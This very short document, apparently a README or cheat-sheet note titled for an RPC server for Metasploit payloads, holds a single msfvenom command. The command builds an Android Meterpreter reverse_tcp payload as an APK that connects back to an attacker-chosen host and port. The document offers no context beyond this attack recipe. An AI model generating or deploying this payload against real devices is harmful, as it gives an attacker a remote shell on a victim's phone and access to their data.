RPC SERVER FOR MSF PAYLOADS

# connection 
./msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip_address> LPORT=<your_listener_port> -o payload.apk
